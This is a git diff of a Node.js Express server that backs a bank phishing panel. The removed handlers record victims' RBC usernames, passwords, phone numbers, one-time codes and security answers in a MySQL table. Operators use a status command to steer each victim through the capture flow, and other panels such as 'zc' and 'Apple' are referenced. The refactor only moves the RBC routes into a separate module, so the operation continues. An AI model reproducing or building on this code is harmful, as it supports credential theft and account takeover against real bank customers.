@@ -6,7 +6,6 @@ var cors = require("cors");
 var fs = require("fs");
 var CryptoJS = require("crypto-js");
 require("dotenv").config();
-const mysql = require("mysql");
 
 const port = process.env.PORT || 8080;
 
@@ -15,25 +14,6 @@ const app = express();
 app.use(bodyparser.json());
 app.use(cors());
 app.use(fileUpload());
-
-var panelConnection = mysql.createConnection({
-  host: process.env.dbHost,
-  user: process.env.dbUsername,
-  password: process.env.dbPass,
-  database: "panels",
-  port: 12987,
-  multipleStatements: true,
-});
-
-panelConnection.connect((err) => {
-  if (!err) {
-    console.log("Db Connection Succeed");
-  } else {
-    console.log(
-      "Db connect Failed \n Error :" + JSON.stringify(err, undefined, 2)
-    );
-  }
-});
 
 mongoose.connect(process.env.mongoURL);
 const db = mongoose.connection;
@@ -1755,147 +1735,7 @@ app.post("/zcSaveLogin", cors(), (req, res) => {
 });
 
 //RBC
-//RBC
-//RBC
-
-app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
-  uniqueid = req.params.id;
-  owner = req.params.owner;
-
-  let details = [uniqueid, owner];
-  let query = `SELECT * FROM rbc WHERE uniqueid= ? AND owner = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send(rows);
-    else console.log(err);
-  });
-});
-
-app.get("/rbcCustomers/:owner", (req, res) => {
-  owner = req.params.owner;
-  let details = [owner];
-  let query = `SELECT * FROM rbc WHERE owner = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send(rows);
-    else console.log(err);
-  });
-});
-
-app.post("/rbcCommand", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  newStatus = req.body.status;
-  if (newStatus == 5) {
-    question = req.body.question;
-    let details = [newStatus, question, uniqueid];
-    let query = `UPDATE rbc SET status = ?, question = ? WHERE uniqueid= ?`;
-    panelConnection.query(query, details, (err, rows, fields) => {
-      if (!err) res.send("Update Completed");
-      else console.log(err);
-    });
-  } else {
-    let details = [newStatus, uniqueid];
-    let query = `UPDATE rbc SET status = ? WHERE uniqueid= ?`;
-    panelConnection.query(query, details, (err, rows, fields) => {
-      if (!err) res.send("Update Completed");
-      else console.log(err);
-    });
-  }
-});
-
-app.get("/rbcCustomers/:id/:owner", (req, res) => {
-  uniqueid = req.params.id;
-  owner = req.params.owner;
-
-  let details = [uniqueid, owner];
-  let query = `SELECT * FROM rbc WHERE uniqueid= ? AND owner = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send(rows);
-    else console.log(err);
-  });
-});
-
-app.post("/rbcSaveLogin", cors(), (req, res) => {
-  username = req.body.username;
-  password = req.body.password;
-  ip = req.body.ip;
-  owner = req.body.owner;
-  uniqueid = req.body.uniqueid;
-
-  let details = [username, password, uniqueid, ip, owner];
-  let query = `INSERT INTO rbc(username,password,uniqueid,status,ip,owner) VALUES (?,?,?,1,?,?)`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
-  });
-});
-
-app.post("/rbcSaveTelephone", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  telephone = req.body.telephone;
-
-  let details = [telephone, uniqueid];
-  let query = `UPDATE rbc SET telephone= ?, status = 2 WHERE uniqueid = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
-  });
-});
-
-app.post("/rbcSaveQuestion", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  answer = req.body.answer;
-
-  let details = [answer, uniqueid];
-  let query = `UPDATE rbc SET answer= ?, status = 6 WHERE uniqueid = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
-  });
-});
-
-app.post("/rbcSaveOtp", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  otp = req.body.otp;
-
-  let details = [otp, uniqueid];
-  let query = `UPDATE rbc SET otp= ?, status = 4 WHERE uniqueid = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
-  });
-});
-
-app.post("/rbcSaveLoginAgain", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  username = req.body.username;
-  password = req.body.password;
-
-  let details = [username, password, uniqueid];
-  let query = `UPDATE rbc SET username= ?, password= ?, status = 8 WHERE uniqueid = ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
-  });
-});
-
-app.post("/rbcDeleteentry/:id", cors(), (req, res) => {
-  uniqueid = req.params.id;
-
-  let details = [uniqueid];
-  let query = `DELETE FROM rbc WHERE uniqueid= ?`;
-
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Update Completed");
-    else console.log(err);
-  });
-});
+app.use('/rbc', require('./routes/rbc'))
 
 //APPLE PANEL
 //APPLE PANEL
